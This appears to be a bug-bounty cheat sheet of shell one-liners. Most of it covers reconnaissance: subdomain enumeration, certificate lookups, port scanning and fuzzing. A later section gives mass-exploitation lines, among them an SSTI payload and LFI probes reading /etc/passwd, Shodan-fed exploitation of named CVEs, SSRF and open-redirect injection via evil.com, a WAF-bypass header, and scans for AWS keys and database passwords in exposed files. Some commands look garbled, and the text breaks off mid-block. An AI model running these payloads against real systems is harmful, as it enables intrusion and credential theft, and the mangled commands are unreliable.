<p align="center">
   <img src="one-unscreen.gif" style="height: 200px; width: 200px;">
</p>

<div align="center">

<table>
  <tr>
    <td><a href="/CREDIT.md">CREDIT</a></td>
    <td><a href="/TOOLS.md">TOOLS & RESOURCES</a></td>
    <td><a href="/CHEAT-SHEET.md">CHEAT SHEET</a></td>
  </tr>
</table>

</div>

<details>
<summary><b>Why i made this doc ?</b></summary>
  
> 1. I was devloping tools that already exist ( it saves time )
> 2. There are many methodologies/vulnerability unknown to me ( it helps gain more knowledge act fast in bug bounty )
> 3. originally i gatherd have over 1600 oneliner commands after manually audting each command i found some of are not usefull some are repeted commands 
</details>

---

<details>
<summary><b>Recon CheckList</b></summary>

- Domain Enumeration 
- Certificate Logs
- OSINT Sources: Google dorks, Pastebin, GitHub, Shodan, Censys 
- Port Scanning
- Web Crawling & Fuzzing
- Parameter Discovery
- Tech Fingerprinting
</details>

# RECON
---
<center><b>Subdomain Enumeration & Bruteforce</b></center>

>**subdomain enum tools**

```bash
curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
# Extract domains from Content-Security-Policy headers by parsing curl response headers.
```
```bash
# Extracts all DNS names (domains) listed in a target's SSL certificate.
echo | openssl s_client -connect https://targetdomain.com:443 | openssl x509 -noout -text | grep DNS
```
```bash
# Get Favicon Hash of your target Domain ( favicon hash finds domain or tech that have same hash )
curl -s -L -k https://TARGET.COM/favicon.ico | python3 -c 'import mmh3, sys, codecs; print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))'
```
```bash
# Get favicon hash with 'favicon-hash.kmsec.uk' api
curl https://favicon-hash.kmsec.uk/api/?url=https://test.com/favicon.ico | jq
```
```bash
# favicon hash extraction at scale (L)
cat p.txt | httpx -favicon -silent
```
```bash
# finds IP address and port address of that match the favicon hassh => 116323821
shodan search org: "Target" http.favicon.hash:116323821 --fields ip_str,port--separator | awk '{print $1 $2}'
``` 
```bash
# PSQL - search subdomain using cert.sh
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew
```
```bash
# Get Subdomains from IPs
python3 hosthunter.py HOSTS.txt > OUT.txt
```
```bash
# Chaos to search subdomains check cloudflareip scan port.
chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -title -silent
```
```bash
# Extract .js Subdomains
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS
# or
echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1
```
```bash
# Sublist3r One Liner
. <(cat domains | xargs -n1 -i{} python sublist3r.py -d {} -o {}.txt)
```
```bash
# Search subdomains using github and httpx
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
```
```bash
# Search Subdomain using Gospider
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```
```bash
# Find Subdomain
subfinder -d target.com -silent | httpx -silent -o urls.txt
```
```bash
# subfinder x dnsx
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
```
```bash
# from nmap
nmap --script hostmap-crtsh.nse target.com
```
```bash
# Extract subdomains from IP range
nmap IP_range | grep "domain" | awk '{print $5}'
```
```bash
# Domain subdomain extraction
cat url | haktldextract -s -t 16 | tee subs.txt ; xargs -a subs.txt -I@ sh -c 'assetfinder -subs-only @ | anew | httpx -silent  -threads 100 | anew httpDomain'
```
```bash
# Search subdomains in assetfinder using hakrawler spider to search links in content responses
assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
```
```bash
# Search .json subdomain
assetfinder http://tesla.com | waybackurls | grep -E "\.json(?:onp?)?$" | anew 
```
```bash
# subdomain enum & site screenshot
assetfinder http://hackerone.com > recon.txt; for d in $(<recon.txt); do $(cutycapt --url=$d --out=$d.jpg --max-wait=100000); done
```
```bash
# from Censys
censys subdomains target.com
```
```bash
# Gather domains from content-security-policy
curl -v -silent https://$domain --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```
> **subdomain enum service**
```bash
# Get Subdomains from VirusTotal
curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
```bash
# Get Subdomains from BufferOver.run
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```
```bash
# Get Subdomain with cyberxplore
curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" 
```
```bash
# Get Subdomains from securitytrails
curl -s "https://securitytrails.com/list/apex_domain/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u
```
```bash
# Sort & Tested Domains from Recon.dev
curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent
```
```bash
# SonarDNS extract subdomains
wget https://opendata.rapid7.com/sonar.fdns_v2/2021-02-26-1614298023-fdns_a.json.gz ; gunzip 2021-02-26-1614298023-fdns_a.json.gz ; cat 2021-02-26-1614298023-fdns_a.json | grep ".DOMAIN.com" | jq .name | tr '" " "' " / " | tee -a sonar
```
```bash
# Subdomain enumeration with Spyse API
curl -XGET "https://api.sypse.com/v3/data/domain/subdomain?limit=100&offset=100&domain=example.com" -H "Accept: application/json" -H "Authorization: Bearer TOKEN_HERE" 2>/dev/null | jq '.data.items | .[] | .name' | sed -e 's/^"//' -e 's/"$//' | grep example.com
```
```bash
# Subdomain Enumeration with Google Tag Manager.
curl -s "https://www.googletagmanager.com/gtm.js?id=[TARGET-GTM-ID]" | grep -oP '"key","[a-zA-Z0-9.-]+\.[a-z]{2,}"' | awk -F'"' '{print $4}'
```
```bash
# from Riddler.io
curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```
```bash
# from RedHunt Labs Recon API
curl --request GET --url 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=<target.com>&page_size=1000' --header 'X-BLOBR-KEY: API_KEY' | jq '.subdomains[]' -r
```
```bash
# from CertSpotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
```bash
# from ThreatMiner
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u
```
```bash
# from ThreatCrowd
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"
```
```bash
# from AlienVault
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/tesla.com/url_list?limit=100&page=1" | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u
```
```bash
# from subdomain center
curl "https://api.subdomain.center/?domain=target.com" | jq -r '.[]' | sort -u
```
```bash
# subdomain from crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
```bash
# Using Hackertarget
curl https://api.hackertarget.com/hostsearch/?q=hackerone.com | grep -o '\w.*hackerone.com'
```
```bash
# from Archive
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```
```bash
# Get Subdomains from JLDC
curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
```bash
# Get Subdomains from RapidDNS.io
export host="HOST" ; curl -s "https://rapiddns.io/subdomain/$host?full=1**esult" | grep -e "<td>.*$host</td>" | grep -oP '(?<=<td>)[^<]+' | sort -u
```
```bash
# Get Subdomains With sonar.omnisint.io
curl --silent https://sonar.omnisint.io/subdomains/twitter.com | grep -oE "[a-zA-Z0-9._-]+\.twitter.com" | sort -u 
```
```bash
# Get Subdomains With synapsint.com
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2Fdomain.com" | grep -oE "[a-zA-Z0-9._-]+\.domain.com" | sort -u 
```
> **subdomain bruteforce**
```bash
# Bruteforce Subdomains
while read sub; do if host "$sub.example.com" &> /dev/null; then echo "$sub.example.com"; fi; done < wordslist.txt
```
```bash
# Bruteforcing subdomain using DNS Over
while read sub;do echo "https://dns.google.com/resolve?name=$sub.domain.com&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u ; done < wordlists.txt
```
```bash
# Bruteforce subdomains
subfinder -d site.com -all -silent | httpx -silent | hakrawler | tr "[:punct:]" "\n" | sort -u > wordlist.txt

puredns bruteforce wordlist.txt site.com -r resolvers.txt -w output.txt
```
```bash
# Subdomain Bruteforcer with FFUF
ffuf -u https://FUZZ.rootdomain -w jhaddixall.txt -v | grep "| URL |" | awk '{print $4}'
```
---
<center><b>SSL Certificate</b></center>

```bash
# Certificate Verification Command
sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{
    N;s/^.*\n//;:a;s/^\( *\)\(.*\), /\1\2\n\1/;ta;p;q; }' < <(
    openssl x509 -noout -text -in <(
        openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' \
            -connect hackerone.com:443 ) )
# Extracts and formats SSL certificate subject and alternative names from a target domain
```
```bash
# Search domains using openssl + recursivedomain.
xargs -a recursivedomain -P50 -I@ sh -c 'openssl s_client -connect @:443 2>&1 '| sed -E -e 's/[[:blank:]]+/\n/g' | httpx -silent -threads 1000 | anew 
# Mass-tests domains using SSL certificate validation to identify live hosts with valid certificates
```
```bash
# Checking invalid certificate
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
# Identifies and tests domains with expired SSL certificates.
```
---
<center><b>Tech maping & Attack vector discovry ( URL parameter , cookie , old tech stack, path etc )</b></center>

<br>

**<ins>PORT SCANING ( ASN, IP , Network Recon )</ins>**

> Network Scanning and Service Discovery (using Nmap)

```bash
# Clean list of host, port, and version
mkdir nmap; cat targets.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../
```
```bash
# Using Certspotter (With port scanning)
curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq | dig +short -f - | uniq | nmap -T5 -Pn -sS -i - -p 80,443,21,22,8080,8081,8443 --open -n -oG -
```
```bash
# Nmap IP:PORT Parser Piped to HTTPX
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
```
```bash
# Nmap cidr to `ips.txt`
cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt' 1 
```
> **Information Gathering (Passive and Active Using Nmap)**

```bash
# Find All Allocated IP ranges for ASN given an IP address
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net $1 | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```
```bash
# Get CIDR & Orgz from Target Lists
for DOMAIN in $(cat domains.txt);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; done | uniq); done
```
> **Tech Mapping**
```bash
# Find All Allocated IP ranges for ASN given an IP address
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net $1 | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
# This command retrieves all allocated IP ranges for a given ASN by querying RADb. It extracts the ASN from the initial WHOIS lookup and then fetches all associated route objects.
``` 
```bash
# Search for Kubernetes setups in a specific organization and probe them for additional info.
shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title
```
```bash
# Scan IPs ( Shodan )
cat my_ips.txt | xargs -L 100 shodan scan submit --wait 0
# gathering host information including open ports, services, and organizational details
```
```bash
# ( Shodan )
shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str | anew ips.txt
#Searches Shodan's database for IP addresses associated with SSL certificates for a specific domain
```
> **URL & Endpoint Discovery**

```bash
curl -s https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/master/chaos-bugbounty-list.json | jq -r '.programs[].domains[]' | xargs -I@ sh -c 'python3 paramspider.py -d @'
# Enumerate endpoints using chaos bug bounty program domains and paramspider.
```
```bash
for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt; done
# Extract URLs from AlienVault OTX API for each host and save unique URLs.
```
```bash
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'
# Use chaos to gather URLs and deep crawl them with gospider concurrently.
```
```bash
assetfinder domain | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w params.txt -o enumerate'
# Discover hidden parameters using x8 on live subdomains.
```
```bash
# find params using x8
subfinder et.com -silent -all -recursive | httpx -silent | sed -s 's/$/\//' | xargs -I@ sh -c 'x8 -u @ -w parameters.txt -o output.txt'
```
```bash
# find URL with parameter
cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %
# Run ParamSpider to dump URLs with high depth for each host.
```
```bash
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
# Perform subdomain enumeration, HTTP probing, and intensive parameter discovery with Cariddi.
```
```bash
curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
# Extract URLs from sitemap.xml by parsing <loc> tags.
```
```bash
cat urls1 | html-tool comments | grep -oE '\b(https?|http)://[-A-Za-z0-9+&@**%?=~_|!:,.;]*[-A-Za-z0-9+&@**%=~_|]'
# Extract URLs from source code comments in HTML pages.
```
```bash
# API Endpoint discovery
curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
# Extract API endpoint paths from a swagger.json file.
```
```bash
cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
# Probe common admin login paths on domains and filter responses containing "admin".
```
```bash
# path discovery
export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
# Crawl domain with gospider, extract internal paths, probe them with httpx for content length concurrently.
```
> **Directory File Fuzzing** 

```bash
ffuf -c -w urls.txt:URL -w wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json
# Recursively fuzz directories/files on URLs from urls.txt using wordlist.txt, excluding 500/502 errors, outputting verbose JSON results.
```
```bash
feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
# Run feroxbuster fuzzing for multiple file extensions on target URL.
```
```bash
feroxbuster -u https://target.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
# Run feroxbuster directory brute force on target URL with depth 1, extensions enabled, and large directory wordlist.
``` 
```bash
# Using "X-Forwarded-For:127.0.0.1" can sometimes bypass 403 WAF restriction
assetfinder att.com | sed 's**.****' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
# Use assetfinder to find subdomains, probe live hosts, and fuzz directories/files with ffuf using JSON content-type header.
```
```bash
cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e php,html,json,aspx,sql,asp,js'
# Run dirsearch brute force scans on hosts with specified status codes and file extensions.
``` 
> **Miscellaneous Recon & Utility**

```bash
cat subdomains.txt | gau | unfurl paths | rev | cut -d '/' -f1 | rev | sort -u | tee wordlist.txt
# Generate target-based wordlist by extracting last path segments from gau URLs.
```
```bash
cat domains.txt | httpx | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a wordlist.txt
# Create custom wordlist by probing domains, fetching content, tokenizing, normalizing, and sorting unique tokens.
```
```bash
cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'
# Clean ffuf JSON output to extract raw URLs line by line.
```
```bash
cat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt
# Probe hosts for HTTP, fetch content, tokenize and normalize to lowercase, then save unique tokens.
``` 
```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
# Extract URLs with redirects using gf, then test them in parallel via proxy with curl.
```
```bash
cat urls.txt | grep "=" | grep "?" | uro | httpx -ct -silent -nc | grep -i -E "text/html|application/xhtml+xml|application/xml|text/xml|image/svg+xml" | cut -d '[' -f 1 | anew xml_html.txt
# Filter URLs containing parameters, probe content-type headers for HTML/XML types, and save valid URLs.
```
```bash
gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's****n**' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txt
# Generate custom wordlists by extracting keys and paths from gau URLs, filtering out common static file extensions.
```
> **Screenshot & Visual Recon**
```bash
# Screenshots using Nuclei
nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
```
```bash
# Recon subdomains and Screenshot to URL using gowitness
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 
```
```bash
# webscreenshot
python webscreenshot.py -i list.txt -w 40
```
> **Apk**
```bash
# Extract URL's to apk
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's****' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
```
```bash
# Extract endpoints from APK files
apkurlgrep -a path/to/file.apk
```
> **IP**

```bash
echo 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'
# Search ASN ranges with metabigor, generate IP lists, reverse DNS, and deduplicate.
```
```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```
```bash
censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
# Search Censys for hosts related to target.com and extract their IP addresses.
```
```bash
# Get CIDR & Orgz from Target Lists
for DOMAIN in $(cat domains.txt);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
# This script processes domain names to extract CIDR ranges and organizational information from WHOIS records.
```
> **Miscellaneous Utilities**

```bash
for i in `grep -R yaml | awk -F: '{print $1}'`; do cat $i | grep 'BaseURL}}/' | awk -F '{{BaseURL}}' '{print $2}' | sed 's/"//g' | sed "s/'//g"; done
# Extract URL path patterns from nuclei YAML templates by parsing BaseURL placeholders.
``` 
```bash
cat output.json | jq | grep -o '"url": "http[^"]*"' | grep -o 'http[^"]*' | anew out.txt
# Parse ffuf JSON output to extract URLs and save unique URLs to out.txt.
``` 
```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
# Extract all IPv4 addresses from a text file using regex.
```
```bash
# grep only nuclei info
result=$(sed -n 's/^\([^ ]*\) \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3 \4/p' file.txt)
echo "$result"
``` 
> **Fully utomated recon**
```bash
findomain -t domain -q -u url ; axiom-scan url -m subfinder -o subs --threads 3 ; axiom-scan subs -m httpx -o http ; axiom-scan http -m ffuf --threads 15 -o ffuf-output ; cat ffuf-output | tr "," " " | awk '{print $2}' | fff | grep 200 | sort -u
# Complete recon with findomain and axiom: subdomain discovery, HTTP probing, fuzzing, and filtering live URLs.
```
---
## <center>Vulnerability Fuzzing & Exploitation</center>

> **Prototype Pollution**
```bash
# Prototype Pollution
subfinder -d target.com -all -silent | httpx -silent -threads 100 | anew alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```
> **Server Side Template Injection ( SSTI )**
```bash
# Find SSTI at scale
echo "domain" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
```
```bash
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```
```bash
echo target.com | gau --subs --threads 200 | httpx -silent -mc 200 -nc | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt && ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```
> **Cross-Origin Resource Sharing ( CORS )**
```bash
# CORS Misconfiguration
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
```bash
# CORS
echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
```bash
# Search to CORS using assetfinder and rush
assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null"
```
> **Local File Inclusion(LFI) & Path Traversal**
```bash
# CVE-2020-3452 ( path traversal )
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```
```bash
# CVE-2020-5902 (path traversal can lead to LFI & RCE)
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
```bash
# Nginx Path Traversal
cat subdomains.txt | httpx -silent -path "///////../../../../../../etc/passwd" -sc -mc 200 -mr 'root:x' | anew nginx-traversal.txt
```
```bash
# CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000
cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
```
```bash
# CVE-2021-41277 LocalFileInclusion in Metabase
cat live.txt | while read host do;do curl --silent --insecure --path-as-is "$host/api/geojson?url=file:///etc/passwd" | grep -qs "root:x" && echo "$host Vulnerable";done
```
```bash
# Local File Inclusion using httpx
cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew lfi-httpx.txt`
```
```bash
# /api/geojson target IP ranges LFI
cat subdomains.txt | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "/api/geojson?url=file:///etc/passwd" -mr "root:x" | anew geojson-lfi.txt
```
```bash
# Local file inclusion
cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```
```bash
# Local File Inclusion using Gau, gf, xargs
cat sudomains.txt | httpx -silent -threads 500 | gau | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"  2>&1 | grep -q "  root:x" && echo " VULN! %"'`
```
```bash
# Local File Inclusion
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
```bash
# NGINX Path Traversal
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```
> **Open Redirect**
```bash
# Open redirect (subfinder + httprobe + wayback + nuclei )
subfinder -dL domains.txt -all -silent | httprobe | tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t Url-Redirection-Catcher.yaml -l open.txt
``` 
```bash
# Find open redirects at scale
subfinder -d site.com -all -silent | waybackurls | sort -u | gf redirect | qsreplace 'https://example.com' | httpx -fr -title --match-string 'Example Domain'
```
```bash
# Open-redirect
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
```bash
# Open Redirect test using gf.
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```
```bash
# Open-redirect
echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```bash
# Open-redirect
cat subs.txt | (gau || hakrawler || waybackurls || katana) | grep "=" | dedupe | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```
> **Server-Side Request Forgery(SSRF)**
```bash
# SSRF
waybackurls TARGET.COM | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
# Extract archived URLs with parameters, replace parameter values with 'http://evil.com', curl each URL to check if injection is reflected, marking vulnerable URLs.
```
```bash
# Recon to search SSRF Test
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```
```bash
# Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.
cat domains.txt | assetfinder --subs-only | httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
```
```bash
# SSRF using dnsx, httpx, gau, qsreplace
cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau | grep "="  |
qsreplace http://hacker.burpcollaborator.net
```
```bash
# Recon to search SSRF Test
cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr 
```
> **Info Discloser**

```bash
echo example.com | subfinder -silent -all | httpx -silent -path ".env",".mysql_history","echo $(echo $(</dev/stdin) | cut -d "." -f2).sql" -mc 200 -ports 80,443,8080,8443 | grep -E -i "AKIA[A-Z0-9]{16}"
# Search for AWS IAM Access Keys in common config/history files on subdomains.
```
```bash
cat subdomains.txt | httpx -silent -sc -mc 200 -path "/wp-config.php_org" -mr "DB_PASSWORD" | anew wp-config.php_orig
